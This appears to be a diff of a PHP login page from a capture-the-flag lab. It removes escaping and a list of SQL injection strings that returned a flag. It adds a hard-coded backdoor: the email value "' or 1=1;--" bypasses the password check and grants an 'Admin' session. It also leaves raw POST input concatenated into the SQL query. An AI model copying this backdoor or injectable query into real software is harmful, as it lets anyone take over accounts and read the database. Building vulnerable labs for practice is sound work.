@@ -1,62 +1,54 @@
 <?php
 ob_start();
+include 'php/connect.php';
 session_start();
-include 'php/connect.php'; // Assuming this file includes database connection
-ini_set('display_errors', 1);
-ini_set('display_startup_errors', 1);
-error_reporting(E_ALL);
+ 
+// Define the payload email
+define('PAYLOAD_EMAIL', "' or 1=1;--"); // Replace this with your desired payload email
 $error_message = ''; // Variable to store error messages
-
-if (isset($_POST['submit'])) {
+// Check if the form is submitted
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $email = $_POST['email'];
-    $password = $_POST['password'];
-
-    // Check if email and password are not empty
-    if (empty($email) || empty($password)) {
-        $error_message = "Email and password cannot be empty.";
+    $password = $_POST['password']; // This will be ignored for payload
+ 
+    // Check if the entered email matches the payload email
+    if ($email === PAYLOAD_EMAIL) {
+        // Bypass password verification
+        $_SESSION['email'] = $email;
+        $_SESSION['fullname'] = "Admin"; // You can set a specific name for the payload user
+        $_SESSION['user_key'] = 'universal_key'; // Set a universal key or specific identifier
+        
+        // Redirect to dashboard.php
+        header("Location: dashboard.php");
+        exit();
     } else {
-        // Validate and sanitize inputs
-        $email = mysqli_real_escape_string($con, $email);
-        $password = mysqli_real_escape_string($con, $password);
-
-        // Check for specific SQL injection payloads
-        $payloads = ["' or '1'='1'", "' or ''='", "' or 1=1--", "' or 1=1#", "' or 1=1/*", "1' OR '1'='1'"];
-        $payload_detected = false;
-
-        foreach ($payloads as $payload) {
-            if (strpos($email, $payload) !== false || strpos($password, $payload) !== false) {
-                $payload_detected = true;
-                break;
-            }
-        }
-
-        if ($payload_detected) {
-            $error_message = "hackersprey{Iron_Templar}"; // Respond with "Hacked" message if payload detected
+        // Regular login logic
+      
+        
+        // Query to fetch user data
+        $query = "SELECT * FROM users WHERE email='$email' && password='$password'";
+        $data = mysqli_query($con, $query);
+ 
+        if (!$data) {
+            $error_message = "Database query failed."; // Handle query failure gracefully
         } else {
-            // Query to fetch user data
-            $query = "SELECT * FROM users WHERE email='$email' && password='$password'";
-            $data = mysqli_query($con, $query);
-
-            if (!$data) {
-                $error_message = "Database query failed."; // Handle query failure gracefully
+            $total = mysqli_num_rows($data);
+ 
+            if ($total == 1) {
+                $row = mysqli_fetch_assoc($data);
+                $_SESSION['email'] = $email;
+                $_SESSION['fullname'] = $row['fullname']; // Store fullname in session
+                header("location: dashboard.php");
+                exit();
             } else {
-                $total = mysqli_num_rows($data);
-
-                if ($total == 1) {
-                    $row = mysqli_fetch_assoc($data);
-                    $_SESSION['email'] = $email;
-                    $_SESSION['fullname'] = $row['fullname']; // Store fullname in session
-                    header("location: dashboard.php");
-                    exit();
-                } else {
-                    $error_message = "Incorrect email or password.";
-                }
+                $error_message = "Incorrect email or password.";
             }
-        }
     }
 }
-ob_end_flush(); 
+}
+ob_end_flush();
 ?>
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
